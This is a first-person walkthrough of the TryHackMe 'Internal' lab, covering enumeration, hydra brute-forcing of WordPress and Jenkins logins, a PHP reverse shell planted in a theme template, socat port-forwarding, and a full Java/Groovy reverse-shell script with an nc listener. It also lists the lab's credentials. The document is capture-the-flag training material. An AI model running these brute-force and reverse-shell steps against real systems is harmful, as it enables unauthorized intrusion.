### Internal by Tryhackme

first i'll leave the link to room [there](https://tryhackme.com/room/internal) and you can read the scope of "work" about this room if you want.  But basically this room needs to be  seen as real pentest, so...let's start this machine and report all vulnerabilities that i find and how to fix them.

there is a few scope allowances that the "client" provided:

	1. Ensure that you modify your hosts file to reflect "internal.thm". 
	2. Any tools or techniques are permitted in this engagement.
	3. Locate and note all vulnerabilities found.
	4. Submit the flags discovered to the dashboard.
	5. Only the IP address assigned to your machine is in scope.

first, i'm gonna get the ip address from machine and modify my hosts file.

```bash
$ nano /etc/hosts
```

your hosts file will look like this:
![](attachments/Pasted%20image%2020231022110931.png)

and now let's start with nmap scan, i'll create a folder to nmap.

```bash
$ sudo nmap -sS -p- internal.thm -vv > nmap/initial.txt
```
explaining again,i do more enumerations after this first scan using -A flags and specifyng the ports that were found in the first scan.

while it is not done i'll see if there is a http server running...
![](attachments/Pasted%20image%2020231022112918.png)
and had. So, it is the default page of apache but it's nothing there despite of that it can be misconfigured....i'll use gobuster to see if there is any directories exposed or anything like this.

```bash 
$ gobuster -w /usr/share/wordlists/dirbuster/directory-medium-2.3.txt -u internal.thm -x txt,js,php,md
```

![](attachments/Pasted%20image%2020231022115519.png)
ok,good but let me take a look at nmap scan first. And nmap scan found two ports, 80 running http server and 22 running ssh.

so now i have these informations:

	1. the OS of the machine is LINUX and the distro is UBUNTU.
	2. there is a http server and ssh running and open.
	3. there is some directories available to anyone.
	4. apache version is 2.4.29
	5. wordpress version is

note: I will expand this list depending on what I find.

let's look at these directories and see if i get more information.

so,i'm taking note about all of these pages and trying to find an vuln, so when i found something i'll write here

ok i found this:
![](attachments/Pasted%20image%2020231022133902.png)
so,as can you see, this login page of word press is so much verbose. I bet on "admin" user just to clear my mind and he exists and i know it because of this error message, it's  very verbose you know?

if i put another aleatory user:  
![](attachments/Pasted%20image%2020231022140831.png)
so,while i'm checking another pages and trying to find another vulns i'll put hydra to brute force this.

first i'll look the request with burp to see the response and how this post form is sended to server.
![](attachments/Pasted%20image%2020231022141526.png)

```bash
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm http-post-form "/blog/wp-login.php:log=^USER^+&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1:incorrect." -V -F
```

ok so, while hydra is trying there i'll search for more things..
![](attachments/Pasted%20image%2020231022142935.png)

i found another login page, and these erros are weird.

![](attachments/Pasted%20image%2020231022143303.png)
let's gooo. ok now i have credentials and i'm gonna login in the web site.

so, as can you see i have access to wordpress panel and these panel have a lot of ways to make an rce.
![](attachments/Pasted%20image%2020231022143424.png)

and the first thing that i would try here is try to change the php code from a some page to an reverse shell in php and if it doesn't work i'll try using the plugins to get a reverse shell.

there is two ways to do this reverse shell:

	1. Go to Apperance and click in the "Theme Editor" or "Editor" Button, this session of the page allows you edit all php code of some pages, you just need to change the code of one of these pages for an reverse shell code.
	2. Go to Plugins and add an new plugin( maybe you'll need to use a plugin generator or something like this idk)

i'm gonna use the first method beacause is more easier.

![](attachments/Pasted%20image%2020231022144848.png)
i'm gonna modify the "404 Template" to a reverse shell from pentest monkey.

![](attachments/Pasted%20image%2020231022145645.png)

now is just access this file to get the shell, usually these files remain in:

	http://internal.thm/wp-content/themes/pluginname/404.php

but when i was trying to bruteforcing directories with gobuster i didn't find "wp-content" directory, but i found he in:

	http://internal.thm/wp-content/themes/twentyseventeen/404.php

	note: please look at the name of the theme that you edited

so now i'm inside the machine :)
![](attachments/Pasted%20image%2020231022150105.png)
spawn better shell and etc:
![](attachments/Pasted%20image%2020231022150229.png)

i found this user called by "aubreanna" but i can't access your directory.
![](attachments/Pasted%20image%2020231022150311.png)

a lot of files in /var/www/html/ 
![](attachments/Pasted%20image%2020231022150519.png)
i don't forget this machine has a ssh open and mysql running into, so maybe can i leak some credentials?

i'll use grep to see if there is some credentials or something like this

```bash
$ grep --color=always -r -i "pass" 
```

and i didn't find nothing.

i'm found a binary in the snap folder called by "pppd" with suid permission that i want to analyze he with a ghidra, so while i'm doing this i'm gonna run linpeas in my reverse shell and see what happes ;)

a lot of intersting things that linpeas found
![](attachments/Pasted%20image%2020231022153108.png)

nothing here...
![](attachments/Pasted%20image%2020231022153205.png)
nothing here too..
![](attachments/Pasted%20image%2020231022153338.png)

pontentials cve's post exploitation:

	/usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
	/snap/core/8268/usr/lib/snapd/snap-confine  ---> Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)

i'll organize and finish this room tomorrow but while the time of the room doesn't finish i'll try bruteforcing the user aubreanna in ssh :)

now is a new day and yesterday i couldn't find "aubreanna" password :( but in phpmyadmin login page i got in with those credentials that i found before.

![](attachments/Pasted%20image%2020231023063109.png)

then, i have all information of the db and i can create or remove all tables if i want to. But i didn't find anything that help me to get an user or root.

good news, reading linpeas scan and checking the files i found this:
![](attachments/Pasted%20image%2020231022153244.png)
![](attachments/Pasted%20image%2020231023071338.png)
now i have one more credentials and a user privilege in the machine, i'll add in the list above ;)

```bash
$ ssh aubreanna@internal.thm
```

![](attachments/Pasted%20image%2020231023072931.png)
good, got the first flag! and have this jenkins running locally.

first i'll make a port forwarding to open this service and makes possible to me access it, if you want a explanation about port forwarding there is an notes that i made [notion-note](https://vivacious-church-b42.notion.site/port-forwarding-da3f15d4da6c4d06b2488687267165c2?pvs=4)

```bash
in my machine:
$ sudo apt update && sudo apt install socat # help us to make the port forwarding but ssh can be used
$ cd /usr/bin
$ python3 -m http.server 8080

in internal machine:
$ wget http://127.0.0.1:8080/socat
$ ./socat tcp-listen:8888,reuseaddr,fork tcp:localhost:8080 &
```

and now the port 8888 is open:
![](attachments/Pasted%20image%2020231023075622.png)

accessing it:
![](attachments/Pasted%20image%2020231023075700.png)
another login page! i'm going to die i swear bro.

this site use cookies...

and...anyone works :(
![](attachments/Pasted%20image%2020231023082133.png)
ok, now i know that the version is 2.250.

	THIS SPACE BETWEEN WHEN I FOUND THE VERSION AND THE COMMENT BELOW WAS 1 DAY AND A FEW HOURS...........

i was entering on a giant habbit hole and the only thing what i needed to do was brute force it ;) 

ok,let me explain myself, maybe i'm dumb or something but i hadn't way to knowing it, even knowing that "admin" user is the standard user for jenkins service.

i've tried all that you can imagine, probaly i read two hundred blogs and search five thousand files in the ssh session between this time....but i found this beautiful words here about jenkins:

	For Red Teamers, Jenkins is also the battlefield that every hacker would like to control. If someone takes control of the Jenkins server, he can gain amounts of source code and credential, or even control the Jenkins node! In our DEVCORE Red Team cases, there are also several cases that compromised whole the corporation just from a Jenkins server as the entry point!

so,it's so much simpler that i wanna kill myself.

first i need to open burp to capture the post to jenkins server because i'm gonna use this to make the hydra command 
![](attachments/Pasted%20image%2020231025044118.png)

```bash
$ hydra -l admin -P /usr/share/wordlists/wordlists/rockyou.txt internal.thm -s 8888 http-form-post "j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" -V -F
```
really weird, an hour passed and i couldn't do anything, all what i get is false positive and i have an ideia why of it.

look at this response in burp:
![](attachments/Pasted%20image%2020231025062948.png)
look, any strings in response but if i try using my browser:
![](attachments/Pasted%20image%2020231025063321.png)
and with curl:
![](attachments/Pasted%20image%2020231025063355.png)
i'm need to tidy up the hydra command to brute force it, but i don't know as the answer is going to hydra, the command above send their request to "j_acegi_security_check" and this don't send any response with strings(i don't know with has any other way to especify S or F in hydra but i didn't see anything in help and http-post-form -U so...), but in browser i'm redirected to ""/loginError" and in curl i don't have ideia what is going on...

changing hydra command to

```bash
hydra -l admin -P /usr/share/wordlists/wordlists/rockyou.txt 10.10.51.182 -s 8888 http-form-post "/login?from=%2F:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" -V -F -I
```
now i'm sending my request to "/login" but the page response sending it to "j_acegi_security_check" and after redirect me to "loginError" if it is wrong credentials, so  i don't know if it will work :(

probaly not and i'll need to use another tool.

nop,i could after using hydra with debug option i understood better.
![](attachments/Pasted%20image%2020231025070448.png)
after a few tries hydra receives a bad request( maybe the command that i write was wrong and the request went wrong)


so i wrote the command again to send the request to /j_acegi_security_check, and analyzing hydra...

the first image below is hydra sending get request to /j_acegi_security_check to see if the page is on or exists:
![](attachments/Pasted%20image%2020231025070718.png)
if hydra receives the response, he is gonna make their request with password and user: 
![](attachments/Pasted%20image%2020231025070817.png)
and after receives another response, he is gonna read and see with my conditional is in:
![](attachments/Pasted%20image%2020231025070853.png)
AND HERE WAS THE PROBLEM.  i don't know why but is my mind i'm thinking hydra receives like a web browser and he didn't read the headers as strings (????). Yeah i'm really dumb, then when i remembered that all is just a big sausage of bytes and hydra just read this all of this bytes including header's looking for my conditional string i got it right. so when i changed my conditional string not for  "Invalid Password or username" that i was seeing in my browser but for "/loginError" which was the page  that this webapp redirect me if the password was wrong I FINALLY FOUND THE CREDENTIALS :).

as can you see in the image above "attempt result: found 1" because in response had the "/loginError".

```bash
$ hydra -l admin -P /usr/share/wordlists/wordlists/rockyou.txt internal.thm -s 8888 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:/loginError" -V -F
```
![](attachments/Pasted%20image%2020231025072843.png)
<<<<<<< HEAD
login in it:
![](attachments/Pasted%20image%2020231025073201.png)

so now,i'm using the same technique that i used in wordpress since i can execute script's here, i'm gonna use this script https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76

or just copy from here:

```
String host="127.0.0.1";
int port=8044;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
change the host String to your ip and open in your machine the port 8044 using nc

```
$ nc -lvnp 8044
```

![](attachments/Pasted%20image%2020231025081856.png)
i'm dumb with docker and containers so probaly the machine before was container and now it is the real machine, i'm gonna look around to see if i find something like the last time

![](attachments/Pasted%20image%2020231025082919.png)

and now...
![](attachments/Pasted%20image%2020231025083252.png)
error...really i'm not disapointed. let's try with ssh
![](attachments/Pasted%20image%2020231025083557.png)
thanks god.

all credentials:

	ssh-loginUser='aubreanna';
	ssh-loginPassword='bubb13guM!@#123';
	jenkins-loginUser='admin';
	jenkins-loginPass='spongebob';
	wp-loginUser='admin';
	wp-loginPass='my2boys';
	$dbpass='B2Ud4fEOZmVq';
	$dbuser='phpmyadmin';
	define('DB_PASSWORD', 'wordpress123');
	define('DB_USER', 'wordpress');

so, recapping all:

first this machine had a web page in port 80, but it was only the apache web server. Making a directory brute force i found directories like  "/blog", "/phpmyadmin" and "/wordpress". 

/blog directory had a login page in wp-login.php, and it was so verbose, which makes easy to brute force even without any user. Then, hydra found the password from "admin" user and having access to wordpress panel, has a lot of ways to making code execution.  i did a  reverse shell and it was a docker, making some enumerations i found the password from user aubreanna.

Logging with aubreanna user in ssh, i got the user flag and an txt file saying that jenkins server is running locally. Then i did a port forwarding to open this service using socat. Another login page, after MUCH time i could brute force another login again and get an connection using scripts in jenkins panel. 

Inside the real machine, not an docker. I did the same thing that is looking around and search for files with passwords or somethings like this, and the root credentials was in the /opt/note.txt file  :) 

all of these problems would be avoided with the owners used strongs passwords and using some protections to bruteforcing forms :) 
